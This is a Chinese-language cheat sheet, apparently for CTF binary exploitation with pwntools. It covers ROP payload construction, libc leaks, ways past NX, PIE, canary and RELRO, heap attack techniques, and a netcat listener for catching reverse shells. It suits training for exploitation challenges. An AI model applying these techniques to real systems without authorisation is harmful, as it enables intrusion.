# refs/pwn.md — 二进制利用（Pwn）工具箱

> 全流程：checksec → 定位漏洞 → 算偏移 → 构造 payload → 本地打通 → 打远程。
> pwntools 已装，绝大多数脚手架用它写。

## 1. 开局三件套

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
e = ELF('./chall'); libc = ELF('./libc.so.6')
print(e.checksec())                     # Canary/NX/PIE/RELRO
print(e.got, e.plt)
```
```sh
ROPgadget --binary ./chall | grep 'pop rdi'      # 找 gadget
ropper --file ./chall --search "pop rdi; ret"
one_gadget ./libc.so.6                            # 一血 gadget（需 libc 版本匹配）
seccomp-tools dump ./chall                        # 有沙箱时看允许哪些 syscall
patchelf --set-interpreter /path/ld.so --set-rpath /path ./chall   # 换 libc 打通本地
nc -lvnp 4444                                     # 起监听（收反弹 shell / 手搓协议）
```

## 2. 常用片段

```python
# 算偏移
p = process('./chall'); p.sendline(cyclic(200))
p.wait(); core = p.corefile; print(cyclic_find(core.read(core.rsp, 4)))
# 或：gdb 里 info registers / x/gx $rsp 后 cyclic_find

# 泄露
p.recvuntil(b'name:')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))

# 一段式
payload = flat([b'A'*offset, pop_rdi, e.got['puts'], e.plt['puts'], e.symbols['main']])

# 远程
p = remote('1.2.3.4', 9999)
p.interactive()
```

## 3. 保护绕过要点

| 保护 | 绕法 |
|---|---|
| NX | ret2libc / ROP / mprotect 改段权限后再跳 shellcode |
| PIE | 先泄露代码地址（puts(main)、format string），再算基址 |
| Canary | 泄露 canary（格式化串、`write` 越界读）或 fork 爆破（子进程 canary 不变） |
| Full RELRO | GOT 不可写 → 改 `__malloc_hook`/`__free_hook`/exit handler/栈上返回地址 |
| 沙箱（seccomp） | `seccomp-tools dump` 看白名单，改用允许的 syscall（open/read/write 而非 execve） |

## 4. 堆

- 先确定 glibc 版本：`./libc.so.6` 或 `strings libc.so.6 | grep 'GNU C Library'`
- tcache/unsorted bin/fastbin dup、UAF、off-by-one、House of * 系列
- 需要构造 fake chunk 时用 python 按结构体偏移拼（别手算错）：
```python
payload = p64(0) + p64(0x21) + p64(0)*2 + p64(0x21)   # 例：伪造 chunk 头
```

## 5. 跨架构

```sh
file ./chall                      # 先看架构
qemu-mipsel -L /usr/mipsel-linux-gnu ./chall     # MIPS 大端/小端注意字节序
qemu-arm -L /usr/arm-linux-gnu ./chall
qemu-aarch64 -L /usr/aarch64-linux-gnu ./chall
qemu-aarch64 -g 1234 ./chall      # 起调试端口，配 gdb-multiarch 连
```
pwntools 里：`context.arch='aarch64'` + `process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu','./chall'])`

## 6. 纪律

- 本地打通再打远程；远程只发必要交互。
- payload 每个字段写清来历（偏移怎么算的、gadget 从哪来）。
- 拿不到 shell 时把失败回显贴出来，别猜。
